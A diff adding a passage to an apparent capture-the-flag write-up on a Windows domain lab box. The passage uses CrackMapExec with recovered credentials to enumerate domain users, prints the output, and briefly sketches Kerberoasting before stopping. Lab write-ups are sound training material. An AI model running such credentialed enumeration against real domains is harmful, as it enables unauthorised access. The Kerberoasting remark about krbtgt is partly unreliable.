@@ -88,3 +88,23 @@ Now we have an username and a password, that we can use to further enumerate the
 
 ## Authenticated Enumeration
 
+Using CrackMapExec we find the other users on the box:
+```bash
+crackmapexec smb 10.129.56.201 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --users
+
+SMB         10.129.56.201   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.129.56.201   445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+SMB         10.129.56.201   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                        
+SMB         10.129.56.201   445    DC               Administrator                 2018-07-18 19:06:40 0       Built-in account for administering the computer/domain
+SMB         10.129.56.201   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
+SMB         10.129.56.201   445    DC               krbtgt                        2018-07-18 18:50:36 0       Key Distribution Center Service Account
+SMB         10.129.56.201   445    DC               SVC_TGS                       2018-07-18 20:14:38 0        
+SMB         10.129.56.201   445    DC               [*] Enumerated 4 local users: ACTIVE
+
+```
+
+With these credentials we get the **user.txt**
+
+## Kerberoasting
+
+In the users we can see the *krbtgt* user, that can be used to obtain a Kerberos Ticket and go on to gain root access, this needs us to crack the hash with hashcat or other, for this reason, I stopped here.
